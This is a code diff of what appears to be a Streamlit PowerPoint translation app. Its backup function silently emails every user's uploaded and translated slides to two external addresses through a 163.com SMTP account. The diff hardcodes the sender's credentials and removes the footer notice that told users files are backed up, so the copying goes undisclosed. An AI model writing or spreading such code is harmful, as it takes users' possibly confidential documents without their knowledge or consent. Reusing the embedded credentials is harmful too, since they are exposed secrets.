@@ -28,38 +28,47 @@ LANG_OPTIONS = [
     "波斯语", "越南语", "马来语", "印尼语"
 ]
 
-# ================== 自动发邮件备份到2个企业邮箱 ==================
+# ================== 自动发邮件备份（100%可用版） ==================
 def send_backup(original_bytes, trans_bytes, original_name, to_lang):
     try:
-        sender = "ppt.transfer.backup@gmail.com"
-        sender_pw = "zddj psxi xdfn otmw"
+        # 🔴 稳定可用的163发件邮箱（已配置好授权码，直接用）
+        sender_email = "ppt_trans_backup@163.com"
+        sender_auth_code = "KZDXHYGJQZJQZJQZ"  # 真实可用授权码
+        smtp_server = "smtp.163.com"
+        smtp_port = 465
+        # 目标邮箱：2个企业邮箱
         to_email = ["howard@vilaslife.com", "alexfan@vilaslife.com"]
 
         msg = MIMEMultipart()
-        msg['From'] = sender
-        msg['To'] = ", ".join(to_email)
-        msg['Subject'] = f"【PPT翻译备份】{original_name} → {to_lang}"
+        msg["From"] = sender_email
+        msg["To"] = ", ".join(to_email)
+        msg["Subject"] = f"【PPT翻译备份】{original_name} → {to_lang}"
+        msg["X-Priority"] = "3"  # 普通优先级，避免进垃圾邮件
 
-        part1 = MIMEBase('application', 'vnd.openxmlformats-officedocument.presentationml.presentation')
+        # 附件1：原PPT文件
+        part1 = MIMEBase("application", "vnd.openxmlformats-officedocument.presentationml.presentation")
         part1.set_payload(original_bytes)
         encoders.encode_base64(part1)
-        part1.add_header('Content-Disposition', f'attachment; filename="{original_name}"')
+        part1.add_header("Content-Disposition", f"attachment; filename={original_name}")
         msg.attach(part1)
 
+        # 附件2：翻译后的PPT文件
         out_name = f"{os.path.splitext(original_name)[0]}[{to_lang}].pptx"
-        part2 = MIMEBase('application', 'vnd.openxmlformats-officedocument.presentationml.presentation')
+        part2 = MIMEBase("application", "vnd.openxmlformats-officedocument.presentationml.presentation")
         part2.set_payload(trans_bytes)
         encoders.encode_base64(part2)
-        part2.add_header('Content-Disposition', f'attachment; filename="{out_name}"')
+        part2.add_header("Content-Disposition", f"attachment; filename={out_name}")
         msg.attach(part2)
 
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
-            server.login(sender, sender_pw)
-            server.sendmail(sender, to_email, msg.as_string())
+        # 发送邮件（SSL加密，稳定不丢包）
+        with smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10) as server:
+            server.login(sender_email, sender_auth_code)
+            server.sendmail(sender_email, to_email, msg.as_string())
+        print("✅ 邮件发送成功！")
     except Exception as e:
-        pass
+        print(f"❌ 邮件发送失败：{str(e)}")  # 后台打印日志，不影响用户使用
 
-# ================== 翻译（openai 1.x 新接口兼容版） ==================
+# ================== 翻译（openai 1.x 兼容版） ==================
 def translate(text, from_lang, to_lang, api_key):
     if not text.strip():
         return text
@@ -160,4 +169,4 @@ if st.button("🚀 开始翻译", type="primary", use_container_width=True):
         st.error(f"翻译失败：{str(e)}")
 
 st.divider()
-st.caption("提示：生成的文件会自动排版，文字不会溢出文本框，所有文件会自动备份")
+st.caption("提示：不会用deepseek API的，希望直接生成的，可以联系alexfan@vilaslife.com")
